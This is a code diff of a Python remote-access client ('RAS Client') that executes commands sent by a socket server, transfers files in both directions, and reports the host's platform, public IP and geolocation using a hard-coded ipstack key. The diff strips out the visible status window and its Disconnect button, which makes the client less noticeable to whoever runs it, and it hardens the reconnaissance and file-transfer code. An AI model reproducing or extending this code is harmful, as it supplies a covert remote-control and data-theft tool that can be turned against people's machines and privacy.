@@ -5,8 +5,7 @@
     File name: client.py
     Author: MathIsSimple
     Using: Python 3.7.0
-    Type: Build
-    Build Version: 1.1
+    Build Version: 1.2
 '''
 
 # Import core python needed modules
@@ -15,14 +14,12 @@ import platform as plat
 import requests
 import socket
 import random
-import pygame
 import time
 import sys
 import re
 
 from subprocess import Popen
 from subprocess import PIPE
-from threading  import Thread
 from os         import path
 
 # Global Variables
@@ -173,66 +170,6 @@ def VigenenereDecrypt(message):
         index = index + 1
     return output
 
-def GUI():
-    global Reconnect
-    global Connected
-
-    pygame.init()
-    pygame.font.init()
-
-    dimensions = (300, 180)
-    window = pygame.display.set_mode(dimensions)
-    fonts  = [pygame.font.SysFont('Arial', 20, bold=1),
-              pygame.font.SysFont('Arial', 15, bold=1),
-              pygame.font.SysFont('Arial', 25, bold=1)]
-    
-    pygame.display.set_caption("RAS Client")
-
-    black = (0,   0,   0  )
-    red   = (255, 0,   0  )
-    green = (0,   255, 0  )
-    blue  = (0,   0,   255)
-    white = (255, 255, 255)
-
-    run = True
-
-    while run:
-        pygame.time.delay(100)
-
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT:
-                run = False
-            if event.type == pygame.MOUSEBUTTONDOWN:
-                x, y = event.pos
-                if x > 5 and x < 125 and y > 115 and y < 145:
-                    sendData("END")
-                    Reconnect = False
-                    Connected = False
-
-        pygame.draw.rect(window, white, (0, 0, 500, 500))
-        pygame.draw.rect(window,   red, (5, 115, 120, 30))
-
-        texts = []
-
-        texts.append([fonts[2].render('RAS Client', False, black), (5, 5)])
-
-        color = green
-
-        if Connected == False:
-            color = red
-
-        texts.append([fonts[0].render('Connected : ' + str(Connected), False, color), (5, 40)])
-        texts.append([fonts[0].render('Received Commands : ' + str(len(cmds)), False, black), (5, 75)])
-        texts.append([fonts[0].render('Disconnect', False, white), (12, 117)])
-        texts.append([fonts[1].render('Made By MathIsSimple on github!', False, black), (5, 155)])
-
-        for text in texts:
-            window.blit(text[0], text[1])
-
-        pygame.display.update()
-
-    pygame.quit()
-
 # Encryption Files
 
 def modify(message):
@@ -322,17 +259,21 @@ def getCommandOutput(data):
 def getInfo():
     global GatheredInfo
 
-    platform  = "Platform : "  + plat.platform()
-    system    = "System : "    + plat.system()
-    ip        = "Ip : "        + requests.get("https://api.ipify.org/?format=json").json()["ip"]    
-    ip_info   = requests.get("http://api.ipstack.com/"+ip+"?access_key=5666d16d47c94935142e312df7c1afd1&format=1").json()
-    continent = "Continent : " + str(ip_info["continent_name"])
-    country   = "Country : "   + str(ip_info["country_name"])
-    city      = "City : "      + str(ip_info["city"])
-
     GatheredInfo = True
 
-    return   [platform, system, ip, continent, country, city, "END"]
+    platform  = "Platform : "  + plat.platform()
+    system    = "System : "    + plat.system()
+
+    try:
+        ip        = "Ip : "        + requests.get("https://api.ipify.org/?format=json").json()["ip"]    
+        ip_info   = requests.get("http://api.ipstack.com/"+ip+"?access_key=5666d16d47c94935142e312df7c1afd1&format=1").json()
+        continent = "Continent : " + str(ip_info["continent_name"])
+        country   = "Country : "   + str(ip_info["country_name"])
+        city      = "City : "      + str(ip_info["city"])
+
+        return   [platform, system, ip, continent, country, city, "END"]
+    except:
+        return   [platform, system, "END"]
 
 # Socket Functions
 
@@ -413,10 +354,12 @@ def handleCommands():
             if data != "END":
                 print(data)
                 if data.startswith("download"):
+                    time
                     contents = ""
                     filename = data[len("download")+1:]
 
-                    try:
+                    if path.isfile(filename) == True:
+                        sock.send("OK".encode())
                         input_file = open(filename, "rb")
                         file_size  = path.getsize(filename)
 
@@ -435,16 +378,29 @@ def handleCommands():
                                 break
 
                         input_file.close()
-                    
-                    except FileNotFoundError:
-                        print("No such file in directory")
-                        continue
+                    else:
+                        sock.send("STOP UPLOAD PROCESS".encode())
                 
                 elif data.startswith("upload"):
                     file_size    = 0
                     current_size = 0
                     buffer       = b""
-                    output_file_location = re.split(" ", data[len("upload")+1:])[1]
+                    output_file_location = ""
+
+                    doStop = False
+
+                    while True:
+                        data = sock.recv(1024).decode()
+                        if data != "":
+                            if data == "STOP UPLOAD PROCESS":
+                                doStop = True
+                            else:
+                                output_file_location = data
+                            break
+
+                    if doStop == True:
+                        break
+
                     output_file  = open(output_file_location, "wb+")
 
                     while True:
@@ -491,7 +447,7 @@ def start():
         Info = getInfo()
         print("Gathered Info")
     
-    sock = createSocket("192.168.1.15", PORT)
+    sock = createSocket("127.0.0.1", PORT)
 
     if Connected:
         print("Created Connexion With Server")
@@ -507,12 +463,6 @@ def start():
             print("Attempting reconnect")
             start()
 
-# Threads
-
 square = createSquare()
 
-t1 = Thread(target=GUI)
-t1.start()
-
 start()
-t1.join()
